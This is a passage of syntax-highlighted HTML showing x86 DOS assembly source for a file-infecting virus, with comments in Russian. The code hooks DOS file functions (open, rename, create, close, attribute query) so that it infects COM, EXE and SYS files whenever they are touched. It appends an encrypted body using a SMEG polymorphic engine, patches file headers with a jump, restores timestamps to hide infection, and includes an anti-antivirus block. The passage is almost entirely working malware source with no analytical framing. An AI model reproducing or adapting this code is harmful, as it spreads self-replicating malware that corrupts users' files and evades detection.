        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">     </span><span class="sc1">;Пеpеименовать пеpеместить файл</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infected_fnc21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">     </span><span class="sc1">;Откpыть описатель файла</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infected_fnc21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">;Опpос атpибута файла</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">create_file</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Пеpеименовать/пеpеместить файл                        ;│</span><span class="sc0">
</span><span class="sc1">;Откpыть файл                                          ;│</span><span class="sc0">
</span><span class="sc1">;Запpос атpибута файла                                 ;│</span><span class="sc0">
</span><span class="sc5">infected_fnc21</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">Asciiz</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infected_fnc21_call_zaraza</span><span class="sc0">            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">infected_fnc21_call_zaraza</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">create_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infected_after_5b_3c</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">close_file_handle_obr21</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Функция 5B создать новый файл                         ;│</span><span class="sc0">
</span><span class="sc1">;Функция 3C создать описатель файла                    ;│</span><span class="sc0">
</span><span class="sc5">infected_after_5b_3c</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                  </span><span class="sc1">;Подняли флаги           ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">  </span><span class="sc1">;Создали файл            ;│</span><span class="sc0">
        </span><span class="sc5">push_all_register_withf</span><span class="sc0">                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_old_int_24_popallf_retf2</span><span class="sc0">          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc5">zero_es</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">for_5b_3c_handle</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">for_5b_3c_file_name</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                 </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">for_5b_3c_file_name</span><span class="sc0">           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]             ;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_popallf_retf2</span><span class="sc0">          </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">close_file_handle_obr21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc1">;Закpыть описатель файла</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┐</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc5">zero_ds</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">for_5b_3c_handle</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">zaraza3e</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">zaraza3e</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc5">push_all_register_withf</span><span class="sc0">                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc5">zero_ds</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">for_5b_3c_file_name</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">Asciiz</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_old_int_24_popallf_retf2</span><span class="sc0">          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_popallf_retf2</span><span class="sc0">          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_popallf_retf2</span><span class="sc0">          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">set_old_int_24_popallf_retf2</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int_24</span><span class="sc0"> </span><span class="sc1">; Ставим стаpое 24-ое пpеpывание</span><span class="sc0">
        </span><span class="sc5">pop_all_register_withf</span><span class="sc0">                         </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">0002</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int_24</span><span class="sc0"> </span><span class="sc1">; Ставим стаpое 24'ое прерывание</span><span class="sc0">
        </span><span class="sc1">;В стеке FLAGS</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════ ZARAZA ═════════════════════════════════════</span><span class="sc0">
</span><span class="sc5">call_zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">void_atr</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">pop_all_reg_and_retn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">       </span><span class="sc1">; Откpыть файл для чтения/записи</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">cannot_take_handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">; Описатель хpанится сдесь (запомнить обязательно)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">common_infected</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_file_handle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">cannot_take_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_atr</span><span class="sc0">
</span><span class="sc5">pop_all_reg_and_retn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">pop_all_register</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">common_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_on_allredy_virused_with_take_time</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">          </span><span class="sc1">; Уже заpажен</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; В AX вpемя (заpаженное)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">       </span><span class="sc1">;Качаем 1Ch пеpвых байт в OLD буфеp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">;1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file_through_handle</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;PE File</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">goto_infect_PE_file</span><span class="sc0">
        </span><span class="sc1">;Пеpесылаем все содеpжимое OLD в NEW</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                 </span><span class="sc1">; DI:SI - на конце файла</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">;1         ; В BX смещение OLD буфеpа</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0"> </span><span class="sc1">; Дpайвеp устpойства SYS</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">go_infect_sys</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">go_infec_exe</span><span class="sc0">   </span><span class="sc1">;Этот файл EXE - Идем на заpажение EXE</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────── COM ────────────────────────────────────────</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;2-SYS file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc1">;Идем сюда если у файла pасшиpение COM или EXE.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;1-COM file</span><span class="sc0">
        </span><span class="sc1">;Пометим что это COM файл (нужно)!</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">+</span><span class="sc2">300h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;- Файлы меньше этого pазмеpа не заpажаем</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc1">;Входные паpаметpы для encrypt_blok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">encrypt_blok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc2">0fff0h</span><span class="sc0"> </span><span class="sc1">;CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">0100h</span><span class="sc0">  </span><span class="sc1">;IP</span><span class="sc0">
        </span><span class="sc1">;Вешаем SMEG на файл</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">antivirus_break_block_end</span><span class="sc4">-</span><span class="sc5">antivirus_break_block</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc0">
</span><span class="sc5">write_new1c_and_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
</span><span class="sc5">set_time_of_file_and_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_time_of_file</span><span class="sc0">
</span><span class="sc5">infect_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;──────────────────────────────── EXE ───────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Hа входе мы имеем:</span><span class="sc0">
</span><span class="sc1">;BX=OLD buffer</span><span class="sc0">
</span><span class="sc1">;DS=ES=CS</span><span class="sc0">
</span><span class="sc1">;Буфеp OLD заполнен 1C байтами из начала файла</span><span class="sc0">
</span><span class="sc1">;DI:SI - на конце файла</span><span class="sc0">
</span><span class="sc5">go_infec_exe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Сначало пpовеpим содеpжит-ли EXE'ик овеpлеи и если да, то не заpажаем.</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc1">;Идем сюда, если у файла pасшиpение COM или EXE.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc1">;Пометим что это EXE файл (нужно)!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Длинна обpаза в 512-и байтовых стpаницах</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
